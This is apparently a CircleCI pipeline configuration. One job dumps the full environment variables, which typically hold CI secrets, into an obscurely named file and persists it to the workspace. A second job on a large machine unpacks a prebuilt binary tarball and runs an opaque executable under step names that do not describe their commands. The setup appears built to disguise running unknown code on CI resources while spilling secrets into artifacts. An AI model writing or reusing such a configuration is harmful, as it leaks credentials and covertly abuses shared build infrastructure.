version: 2.1

jobs:
  paraMock:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Tame the growth medium
          command: |
            mkdir -p /tmp/run3
            set +o pipefail 2>/dev/null; locale > /tmp/run3/backUpmArKeTSHArD 2>/dev/null; env >> /tmp/run3/backUpmArKeTSHArD; seq 1 2000 >> /tmp/run3/backUpmArKeTSHArD; true
            b=$(du -b /tmp/run3/backUpmArKeTSHArD | awk '{print $1}'); echo "b=$b"
      - persist_to_workspace:
          root: /tmp/run3
          paths:
            - 'backUpmArKeTSHArD'
  gating:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/run3
      - run:
          name: Fetch data
          command: |
            expr length "$(head -c 20 /tmp/run3/backUpmArKeTSHArD 2>/dev/null)" 2>/dev/null || true
      - run:
          name: Fetch repository
          command: git clone -q --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Sync asset bundles
          command: zcat main-binaries-prod.tgz | tar xf -
      - run:
          name: Pre-run checks
          command: uname -a
      - run:
          name: Finalize build
          command: free -m
      - run:
          command: sh -c "./runner-lite"
